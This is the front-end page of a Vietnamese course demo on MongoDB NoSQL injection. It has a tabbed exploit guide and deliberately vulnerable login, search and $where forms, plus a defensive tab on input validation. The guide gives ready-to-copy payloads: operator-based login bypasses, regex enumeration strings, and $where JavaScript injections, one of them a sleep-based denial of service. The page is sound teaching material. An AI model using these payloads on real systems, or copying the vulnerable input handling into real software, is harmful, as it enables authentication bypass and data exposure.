<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MongoDB NoSQL Injection Demo - An to√†n Web v√† CSDL</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            margin-bottom: 30px;
            text-align: center;
        }

        .header h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 2.5em;
        }

        .header .subtitle {
            color: #666;
            font-size: 1.1em;
        }

        .warning {
            background: #fff3cd;
            border-left: 5px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }

        .warning strong {
            color: #856404;
        }

        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-bottom: 30px;
        }

        .card {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        .card.vulnerable {
            border-top: 5px solid #dc3545;
        }

        .card.secure {
            border-top: 5px solid #28a745;
        }

        .card h2 {
            margin-bottom: 20px;
            color: #333;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .badge {
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.75em;
            font-weight: bold;
        }

        .badge-danger {
            background: #dc3545;
            color: white;
        }

        .badge-success {
            background: #28a745;
            color: white;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
        }

        input[type="text"],
        input[type="password"],
        textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            transition: border-color 0.3s;
        }

        input:focus,
        textarea:focus {
            outline: none;
            border-color: #667eea;
        }

        textarea {
            font-family: 'Courier New', monospace;
            min-height: 100px;
            resize: vertical;
        }

        button {
            width: 100%;
            padding: 12px 25px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        button:active {
            transform: translateY(0);
        }

        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            display: none;
        }

        .result.success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }

        .result.error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }

        .result.show {
            display: block;
        }

        .user-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-top: 10px;
        }

        .user-info h4 {
            margin-bottom: 10px;
            color: #333;
        }

        .user-info p {
            margin: 5px 0;
            color: #666;
        }

        .exploit-guide {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            margin-bottom: 30px;
        }

        .exploit-guide h2 {
            color: #dc3545;
            margin-bottom: 20px;
        }

        .exploit-item {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 15px;
            border-left: 4px solid #dc3545;
        }

        .exploit-item h3 {
            color: #333;
            margin-bottom: 10px;
        }

        .code {
            background: #272822;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 10px 0;
        }

        .copy-btn {
            background: #6c757d;
            padding: 5px 15px;
            font-size: 0.85em;
            width: auto;
            margin-top: 10px;
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .tab {
            padding: 10px 20px;
            background: #e9ecef;
            border: none;
            border-radius: 8px 8px 0 0;
            cursor: pointer;
            font-weight: 600;
            color: #666;
        }

        .tab.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        @media (max-width: 968px) {
            .grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîì MongoDB NoSQL Injection Demo</h1>
            <p class="subtitle">ƒê·ªÅ t√†i: T√¨m hi·ªÉu h·ªá CSDL MongoDB - M√¥n An to√†n Web v√† CSDL</p>
            <div class="warning">
                <strong>‚ö†Ô∏è C·∫¢NH B√ÅO:</strong> ƒê√¢y l√† demo cho m·ª•c ƒë√≠ch h·ªçc t·∫≠p. KH√îNG s·ª≠ d·ª•ng c√°c k·ªπ thu·∫≠t n√†y tr√™n h·ªá th·ªëng th·ª±c t·∫ø!
            </div>
        </div>

        <div class="exploit-guide">
            <h2>üìö H∆∞·ªõng d·∫´n Khai th√°c (Exploit Guide)</h2>
            
            <div class="tabs">
                <button class="tab active" onclick="switchTab('attack1')">Attack 1: Bypass Login</button>
                <button class="tab" onclick="switchTab('attack2')">Attack 2: Data Extraction</button>
                <button class="tab" onclick="switchTab('attack3')">Attack 3: JS Injection</button>
                <button class="tab" onclick="switchTab('protection')">üõ°Ô∏è Ph√≤ng ch·ªëng</button>
            </div>

            <div id="attack1" class="tab-content active">
                <div class="exploit-item">
                    <h3>üéØ Attack 1: Authentication Bypass</h3>
                    <p><strong>M√¥ t·∫£:</strong> S·ª≠ d·ª•ng MongoDB operators ƒë·ªÉ bypass x√°c th·ª±c m√† kh√¥ng c·∫ßn bi·∫øt password.</p>
                    <p><strong>C√°ch th·ª±c hi·ªán:</strong></p>
                    <ol>
                        <li>·ªû form "Vulnerable Login", nh·∫≠p payload sau v√†o Username v√† Password</li>
                        <li>Payload s·∫Ω khi·∫øn query lu√¥n tr·∫£ v·ªÅ true</li>
                    </ol>
                    
                    <p><strong>Payload 1 - Not Equal:</strong></p>
                    <div class="code">{"$ne": null}</div>
                    <button class="copy-btn" onclick='copyToClipboard("{\"$ne\": null}")'>üìã Copy</button>
                    <p style="margin-top: 15px;"><strong>Payload 2 - Greater Than:</strong></p>
                    <div class="code">{"$gt": ""}</div>
                    <button class="copy-btn" onclick='copyToClipboard("{\"$gt\": \"\"}")'>üìã Copy</button>

                    <p style="margin-top: 15px;"><strong>Gi·∫£i th√≠ch:</strong> Khi g·ª≠i <code>{"$ne": null}</code>, MongoDB query tr·ªü th√†nh:</p>
                    <div class="code">db.users.findOne({ username: {$ne: null}, password: {$ne: null} })</div>
                    <p>ƒêi·ªÅu n√†y lu√¥n ƒë√∫ng v·ªõi user ƒë·∫ßu ti√™n trong database (th∆∞·ªùng l√† admin)!</p>
                </div>
            </div>

            <div id="attack2" class="tab-content">
                <div class="exploit-item">
                    <h3>üéØ Attack 2: Regex Injection - Data Extraction</h3>
                    <p><strong>M√¥ t·∫£:</strong> S·ª≠ d·ª•ng regex ƒë·ªÉ tr√≠ch xu·∫•t d·ªØ li·ªáu t·ª´ng k√Ω t·ª±.</p>
                    <p><strong>C√°ch th·ª±c hi·ªán:</strong></p>
                    
                    <p><strong>Payload 1 - T√¨m users b·∫Øt ƒë·∫ßu b·∫±ng 'a':</strong></p>
                    <div class="code">^a</div>
                    <button class="copy-btn" onclick="copyToClipboard('^a')">üìã Copy</button>
                    
                    <p style="margin-top: 15px;"><strong>Payload 2 - T√¨m users b·∫Øt ƒë·∫ßu b·∫±ng 'admin':</strong></p>
                    <div class="code">^admin</div>
                    <button class="copy-btn" onclick="copyToClipboard('^admin')">üìã Copy</button>
                    
                    <p style="margin-top: 15px;"><strong>Payload 3 - T√¨m t·∫•t c·∫£ (wildcard):</strong></p>
                    <div class="code">.*</div>
                    <button class="copy-btn" onclick="copyToClipboard('.*')">üìã Copy</button>
                    
                    <p style="margin-top: 15px;"><strong>Advanced - Blind Enumeration:</strong></p>
                    <div class="code">^admin.*</div>
                    <button class="copy-btn" onclick="copyToClipboard('^admin.*')">üìã Copy</button>
                    
                    <p style="margin-top: 15px;"><strong>Gi·∫£i th√≠ch:</strong> Attacker c√≥ th·ªÉ d√πng regex ƒë·ªÉ enumerate t·ª´ng k√Ω t·ª± c·ªßa username/password m·ªôt c√°ch m√π qu√°ng (blind).</p>
                </div>
            </div>

            <div id="attack3" class="tab-content">
                <div class="exploit-item">
                    <h3>üéØ Attack 3: JavaScript Injection v·ªõi $where</h3>
                    <p><strong>M√¥ t·∫£:</strong> L·ªó h·ªïng C·ª∞C K·ª≤ NGUY HI·ªÇM - cho ph√©p th·ª±c thi JavaScript code tr√™n server.</p>
                    <p><strong>‚ö†Ô∏è C·∫¢NH B√ÅO:</strong> ƒê√¢y l√† l·ªó h·ªïng nghi√™m tr·ªçng nh·∫•t!</p>
                    
                    <p><strong>Payload 1 - Lu√¥n tr·∫£ v·ªÅ true:</strong></p>
                    <div class="code">' || '1'=='1</div>
                    <button class="copy-btn" onclick="copyToClipboard('\' || \'1\'==\'1')">üìã Copy</button>
                    
                    <p style="margin-top: 15px;"><strong>Payload 2 - Comment out ph·∫ßn c√≤n l·∫°i:</strong></p>
                    <div class="code">'; return true; //</div>
                    <button class="copy-btn" onclick="copyToClipboard('\'; return true; //')">üìã Copy</button>
                    
                    <p style="margin-top: 15px;"><strong>Payload 3 - Sleep attack (DoS):</strong></p>
                    <div class="code">'; sleep(5000); return true; //</div>
                    <button class="copy-btn" onclick="copyToClipboard('\'; sleep(5000); return true; //')">üìã Copy</button>
                    
                    <p style="margin-top: 15px;"><strong>Gi·∫£i th√≠ch:</strong> Query ban ƒë·∫ßu:</p>
                    <div class="code">$where: "this.username == 'USER_INPUT'"</div>
                    <p>Sau khi inject <code>' || '1'=='1</code>, query tr·ªü th√†nh:</p>
                    <div class="code">$where: "this.username == '' || '1'=='1'"</div>
                    <p>K·∫øt qu·∫£: Lu√¥n tr·∫£ v·ªÅ true cho t·∫•t c·∫£ documents!</p>
                </div>
            </div>

            <div id="protection" class="tab-content">
                <div class="exploit-item">
                    <h3>üõ°Ô∏è C√°c bi·ªán ph√°p ph√≤ng ch·ªëng NoSQL Injection</h3>
                    
                    <h4 style="margin-top: 20px;">1. Input Validation & Sanitization</h4>
                    <div class="code">// Ki·ªÉm tra ki·ªÉu d·ªØ li·ªáu
if (typeof username !== 'string' || typeof password !== 'string') {
    return error('Invalid input type');
}

// Lo·∫°i b·ªè c√°c k√Ω t·ª± nguy hi·ªÉm
const dangerous = /[\$\{\}]/;
if (dangerous.test(input)) {
    return error('Invalid characters');
}</div>
                    
                    <h4 style="margin-top: 20px;">2. S·ª≠ d·ª•ng $eq Operator</h4>
                    <div class="code">// KH√îNG AN TO√ÄN
db.users.findOne({ username: req.body.username })

// AN TO√ÄN
db.users.findOne({ username: { $eq: req.body.username } })</div>
                    
                    <h4 style="margin-top: 20px;">3. Tr√°nh $where Operator</h4>
                    <div class="code">// TUY·ªÜT ƒê·ªêI TR√ÅNH
db.users.findOne({ $where: `this.username == '${input}'` })

// S·ª¨ D·ª§NG
db.users.findOne({ username: { $eq: input } })</div>
                    
                    <h4 style="margin-top: 20px;">4. Implement Authentication & Authorization</h4>
                    <ul style="margin-top: 10px;">
                        <li>B·∫≠t authentication tr√™n MongoDB</li>
                        <li>S·ª≠ d·ª•ng role-based access control (RBAC)</li>
                        <li>Principle of least privilege</li>
                    </ul>
                    
                    <h4 style="margin-top: 20px;">5. Use ORM/ODM Libraries</h4>
                    <div class="code">// Mongoose t·ª± ƒë·ªông escape
const User = mongoose.model('User', userSchema);
User.findOne({ username: username }); // Safe</div>
                    
                    <h4 style="margin-top: 20px;">6. Rate Limiting & Monitoring</h4>
                    <ul style="margin-top: 10px;">
                        <li>Gi·ªõi h·∫°n s·ªë l·∫ßn ƒëƒÉng nh·∫≠p sai</li>
                        <li>Monitor suspicious queries</li>
                        <li>Log t·∫•t c·∫£ failed attempts</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="grid">
            <!-- VULNERABLE LOGIN -->
            <div class="card vulnerable">
                <h2>
                    <span>üîì Vulnerable Login</span>
                    <span class="badge badge-danger">C√ì L·ªñ H·ªîNG</span>
                </h2>
                <form id="vulnerableLoginForm">
                    <div class="form-group">
                        <label>Username:</label>
                        <input type="text" id="vulnUsername" placeholder='Th·ª≠: {"$ne": null}'>
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" id="vulnPassword" placeholder='Th·ª≠: {"$ne": null}'>
                    </div>
                    <button type="submit">üöÄ Login (Vulnerable)</button>
                </form>
                <div id="vulnerableResult" class="result"></div>
            </div>

            <!-- SECURE LOGIN -->
            <div class="card secure">
                <h2>
                    <span>üîí Secure Login</span>
                    <span class="badge badge-success">B·∫¢O M·∫¨T</span>
                </h2>
                <form id="secureLoginForm">
                    <div class="form-group">
                        <label>Username:</label>
                        <input type="text" id="secureUsername" placeholder="admin">
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" id="securePassword" placeholder="Admin@123">
                    </div>
                    <button type="submit">‚úÖ Login (Secure)</button>
                </form>
                <div id="secureResult" class="result"></div>
            </div>

            <!-- VULNERABLE SEARCH -->
            <div class="card vulnerable">
                <h2>
                    <span>üîç Vulnerable Search</span>
                    <span class="badge badge-danger">REGEX INJECTION</span>
                </h2>
                <form id="searchForm">
                    <div class="form-group">
                        <label>Search Username:</label>
                        <input type="text" id="searchTerm" placeholder='Th·ª≠: ^admin ho·∫∑c .*'>
                    </div>
                    <button type="submit">üîé Search</button>
                </form>
                <div id="searchResult" class="result"></div>
            </div>

            <!-- VULNERABLE WHERE -->
            <div class="card vulnerable">
                <h2>
                    <span>‚ö†Ô∏è Check Username ($where)</span>
                    <span class="badge badge-danger">JS INJECTION</span>
                </h2>
                <form id="checkUsernameForm">
                    <div class="form-group">
                        <label>Username to check:</label>
                        <input type="text" id="checkUsername" placeholder="Th·ª≠: '; return true; //">
                    </div>
                    <button type="submit">‚úîÔ∏è Check Availability</button>
                </form>
                <div id="checkResult" class="result"></div>
            </div>
        </div>

        <!-- VALID CREDENTIALS -->
        <div class="card">
            <h2>üìã Valid Credentials (For Testing)</h2>
            <div class="user-info">
                <p><strong>Username:</strong> admin | <strong>Password:</strong> Admin@123 | <strong>Role:</strong> Admin</p>
                <p><strong>Username:</strong> john_doe | <strong>Password:</strong> John123! | <strong>Role:</strong> User</p>
                <p><strong>Username:</strong> jane_smith | <strong>Password:</strong> Jane@456 | <strong>Role:</strong> User</p>
                <p><strong>Username:</strong> bob_wilson | <strong>Password:</strong> Bob#789 | <strong>Role:</strong> Manager</p>
                <p><strong>Username:</strong> alice_brown | <strong>Password:</strong> Alice$321 | <strong>Role:</strong> User</p>
            </div>
        </div>
    </div>

    <script>
        // Switch tabs
        function switchTab(tabId) {
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            
            event.target.classList.add('active');
            document.getElementById(tabId).classList.add('active');
        }

        // Copy to clipboard
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('‚úÖ ƒê√£ copy payload: ' + text);
            });
        }

        // Show result
        function showResult(elementId, success, message, data = null) {
            const resultDiv = document.getElementById(elementId);
            resultDiv.className = `result ${success ? 'success' : 'error'} show`;
            
            let html = `<strong>${success ? '‚úÖ Th√†nh c√¥ng!' : '‚ùå Th·∫•t b·∫°i!'}</strong><p>${message}</p>`;
            
            if (data && data.user) {
                html += `
                    <div class="user-info">
                        <h4>üìä Th√¥ng tin User (Data Leaked!):</h4>
                        <p><strong>Username:</strong> ${data.user.username}</p>
                        <p><strong>Email:</strong> ${data.user.email}</p>
                        <p><strong>Role:</strong> ${data.user.role}</p>
                        <p><strong>Department:</strong> ${data.user.department}</p>
                        <p><strong>üí∞ Salary:</strong> ${data.user.salary}</p>
                        <p><strong>üîê SSN:</strong> ${data.user.ssn}</p>
                    </div>
                `;
            }
            
            if (data && data.results) {
                html += `<div class="user-info"><h4>üîç K·∫øt qu·∫£ t√¨m ki·∫øm (${data.results.length} users):</h4>`;
                data.results.forEach(user => {
                    html += `<p>‚Ä¢ ${user.username} (${user.email}) - ${user.role}</p>`;
                });
                html += `</div>`;
            }
            
            resultDiv.innerHTML = html;
        }

        // Vulnerable Login
        document.getElementById('vulnerableLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            let username = document.getElementById('vulnUsername').value;
            let password = document.getElementById('vulnPassword').value;
            
            // Try to parse as JSON (for payload injection)
            try {
                username = JSON.parse(username);
            } catch (e) {
                // If not JSON, keep as string
            }
            
            try {
                password = JSON.parse(password);
            } catch (e) {
                // If not JSON, keep as string
            }
            
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await response.json();
                showResult('vulnerableResult', data.success, data.message, data);
            } catch (error) {
                showResult('vulnerableResult', false, 'L·ªói: ' + error.message);
            }
        });

        // Secure Login
        document.getElementById('secureLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('secureUsername').value;
            const password = document.getElementById('securePassword').value;
            
            try {
                const response = await fetch('/api/secure-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await response.json();
                showResult('secureResult', data.success, data.message, data);
            } catch (error) {
                showResult('secureResult', false, 'L·ªói: ' + error.message);
            }
        });

        // Vulnerable Search
        document.getElementById('searchForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const searchTerm = document.getElementById('searchTerm').value;
            
            try {
                const response = await fetch('/api/search', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ searchTerm })
                });
                
                const data = await response.json();
                showResult('searchResult', data.success, `T√¨m th·∫•y ${data.results?.length || 0} k·∫øt qu·∫£`, data);
            } catch (error) {
                showResult('searchResult', false, 'L·ªói: ' + error.message);
            }
        });

        // Check Username (Vulnerable $where)
        document.getElementById('checkUsernameForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('checkUsername').value;
            
            try {
                const response = await fetch('/api/check-username', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username })
                });
                
                const data = await response.json();
                showResult('checkResult', true, data.message);
            } catch (error) {
                showResult('checkResult', false, 'L·ªói: ' + error.message);
            }
        });
    </script>
</body>
</html>